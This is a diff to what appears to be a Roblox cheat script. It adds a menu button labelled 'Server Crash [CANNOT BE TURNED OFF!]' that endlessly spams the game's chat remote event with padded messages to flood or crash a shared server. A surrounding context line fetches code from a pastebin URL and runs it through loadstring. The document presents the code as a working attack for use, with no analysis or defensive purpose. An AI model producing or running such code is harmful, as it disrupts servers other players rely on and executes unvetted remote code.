@@ -42,6 +42,23 @@ Section:NewButton("keyboard v2", "better version",function()
     loadstring(game:HttpGet('https://pastebin.com/raw/A2fuE00J'))()
 end)
 
+Section:NewButton("Server Crash [CANNOT BE TURNED OFF!]", "none",function()
+    while wait() do
+local Message = "😈"
+local Unicode = " "
+Message = Message .. Unicode:rep(200 - #Message)
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local SayMessageRequest = ReplicatedStorage:FindFirstChild("SayMessageRequest", true)
+
+if SayMessageRequest then
+    for i = 1, 7 do
+        SayMessageRequest:FireServer(Message, "All")
+    end
+end
+wait(math.random(12,14))
+end 
+end)
 
 -- Other Things Tab
 local Tab2 = Window:NewTab("Other Things")
